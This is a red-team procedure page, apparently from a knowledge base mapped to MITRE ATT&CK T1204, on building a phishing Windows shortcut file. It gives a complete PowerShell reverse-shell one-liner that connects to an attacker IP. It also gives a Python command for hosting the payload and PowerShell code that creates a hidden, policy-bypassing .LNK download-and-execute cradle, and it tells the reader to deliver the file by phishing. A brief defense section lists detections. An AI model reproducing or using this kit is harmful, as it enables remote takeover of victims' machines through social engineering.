---
id: ff98e002-b7c2-442a-a4ea-876bc952c31b
type: procedure
verified: true
submitted: true
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques: []
tags:
  - '[[tags/Phishing]]'
commands:
  - '[[commands/Launch-Python3-Web-Server]]'
  - '[[commands/PowerShell-Create-LNK-File-with-PowerShell-Payload]]'
platforms:
  - Windows
tools: []
validated: true
---

# Create-LNK-File-with-Custom-PowerShell-Payload

## Summary

This procedure demonstrates how to create a Windows shortcut (.LNK) file that, when executed by a user, downloads and runs a custom PowerShell payload from an attacker-controlled web server. It is commonly used in phishing campaigns to achieve remote code execution on a target Windows machine without requiring direct access.

## Description

.LNK files are Windows shortcut files that can be crafted to execute arbitrary commands, such as downloading and invoking PowerShell scripts. This technique relies on user interaction to open the shortcut, making it suitable for social engineering attacks like email phishing. The payload is hosted on a simple HTTP server, and the LNK file embeds a PowerShell command to fetch and execute it. This approach bypasses some execution policies and can establish a reverse shell connection back to the attacker. It targets Windows environments where PowerShell is available, and the attacker needs control over a web server to host the payload file.

## Requirements

1. Attacker machine with Python 3 installed to host the payload file.
2. Target Windows machine with PowerShell enabled (default on modern Windows).
3. Network access from target to attacker web server (e.g., no firewall blocking outbound HTTP).
4. The .LNK file should be created on a Windows machine matching the target's version for compatibility.

## Defense

Defensive measures and detection strategies:

- Enable PowerShell logging (Module, Script Block, and Transcription logging) to capture downloaded and executed scripts.
- Use application whitelisting (e.g., AppLocker or WDAC) to block unsigned PowerShell scripts or unexpected executions.
- Monitor for outbound HTTP connections to unusual IPs/ports from user machines.
- Educate users on phishing risks and disable automatic file downloads in email clients.
- Scan attachments for .LNK files and block them via email gateways or EDR tools.

## Objectives

1. Host a malicious PowerShell payload on an attacker-controlled server.
2. Generate a .LNK shortcut that downloads and executes the payload upon user interaction.
3. Achieve remote code execution, such as establishing a reverse shell, on the target Windows machine.
4. Maintain stealth by hiding the PowerShell window and bypassing basic execution policies.

## Instructions

### Step 1: Prepare the PowerShell Payload

**Context**: Create the payload script content, which will be saved as a file and hosted. This is a TCP reverse shell that connects back to the attacker. Reference the standalone code snippet for the exact payload.

**Code** ([[codes/PowerShell-TCP-Reverse-Shell-One-Liner]]):

Save the following code as `shell.ps1` on the attacker machine:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

> Replace `$ATTACKER_IP` and `$ATTACKER_PORT` with actual values before saving. This step prepares the file that the LNK will download.

### Step 2: Host the Payload File

**Context**: Start a simple web server on the attacker machine to serve the `shell.ps1` file over HTTP. This allows the target to download it when the LNK is executed.

**Command** ([[commands/Launch-Python3-Web-Server]]):

```bash
python3 -m http.server $_PORT
```

> Run this in the directory containing `shell.ps1`. Common port is 80 or 8080. Expected output includes "Serving HTTP on 0.0.0.0 port $_PORT". Verify by accessing http://$_ATTACKER_IP:$_PORT/shell.ps1 in a browser.

### Step 3: Create the LNK Shortcut File

**Context**: Use PowerShell to generate the .LNK file that points to powershell.exe with arguments to download and execute the hosted script. This embeds the download URL directly in the shortcut.

**Command** ([[commands/PowerShell-Create-LNK-File-with-PowerShell-Payload]]):

```powershell
$WScript = New-Object -COM WScript.shell
$SC = $WScript.CreateShortcut('pwn.lnk')
$SC.TargetPath="powershell.exe"
$SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_ATTACKER_IP/$_FILENAME.ps1')"
$SC.Save()
```

> Execute on a Windows machine. Replace $_ATTACKER_IP with your IP and $_FILENAME with 'shell'. This creates 'pwn.lnk'. No output if successful; verify by checking if 'pwn.lnk' exists and opening its properties to confirm the target and arguments.

### Step 4: Deliver and Execute

**Context**: Transfer the .LNK file to the target via phishing email or shared drive. When the user double-clicks it, the payload downloads and runs silently.

> No specific command; use social engineering. On success, a reverse shell connects back to your listener (e.g., netcat on $ATTACKER_PORT). If it fails, check web server logs for download attempts or PowerShell execution logs on target.
